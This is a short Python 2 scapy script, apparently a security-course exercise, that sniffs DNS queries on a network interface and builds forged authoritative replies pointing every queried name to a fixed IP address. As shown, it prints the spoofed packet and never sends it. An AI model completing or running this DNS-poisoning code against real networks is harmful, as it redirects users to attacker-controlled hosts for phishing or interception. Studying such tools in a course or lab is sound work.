#!/usr/bin/python
from scapy.all import *

################################################################
# SPSE Module 3. Lesson 8. EX 1                                #
# DNS Poisoning tool. Similar to DNSspoof using scapy          #
################################################################
# This script must receive (capture a DNS request packet, reply to the
# originator with incorrect information, meaning:
# 1. Sniff traffic to capture dnsn requests
# 2. Forge a response packet with some evil info in it
# 3. Verify on the client side
# 
# Inspired by: http://danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/


def run_dns_spoof():
  # Sniffing, looking for DNS traffic
  while True:
#    pkts = sniff(iface = 'wlo2', count = 1, filter = 'port 53', prn = lambda x: x.summary())
    pkts = sniff(iface = 'wlo2', count = 1, filter = 'port 53')
    if DNSQR in pkts[0]:
      print '-[Req Detectado]'
      print pkts[0][DNS].qd
      print pkts[0][IP].dst
      # When query detected we will craft a spoofed DNS Response
      resp = IP(proto = 'udp', src = pkts[0][IP].dst, dst = pkts[0][IP].src)/\
             UDP(sport = pkts[0][UDP].dport, dport = pkts[0][UDP].sport) /\
             DNS(qr = 1, opcode ='QUERY', aa = 1, ancount = 1, qd = pkts[0][DNS].qd, an=DNSRR(rrname=pkts[0][DNS].qd.qname, rdata = '167.206.145.40'))
      print '%s' %(resp)
    if DNSRR in pkts[0]:
      print '+[Rsp Detectado]'

def main():
  run_dns_spoof()
  
# Standard Boiler plate
if __name__ == '__main__':
  main()
